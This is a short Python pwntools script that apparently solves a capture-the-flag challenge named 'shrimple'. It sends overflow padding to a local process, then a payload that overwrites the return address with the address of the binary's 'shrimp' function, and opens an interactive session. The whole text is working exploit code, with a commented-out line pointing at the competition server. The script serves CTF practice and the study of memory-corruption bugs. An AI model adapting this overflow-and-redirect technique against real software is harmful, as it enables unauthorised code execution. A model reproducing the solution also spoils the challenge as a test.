from pwn import *

# p = remote("chal.competitivecyber.club", 8884)
exe = ELF('./shrimple', checksec=False)
p = process(exe.path)

input()
payload = b'a'*43 + b'\0'
p.sendlineafter(b'>> ', payload)

payload = b'a'*42 + b'\0'
p.sendlineafter(b'>> ', payload)

payload = b'a'*38 + p64(exe.sym['shrimp'])

p.sendlineafter(b'>> ', payload)
p.interactive()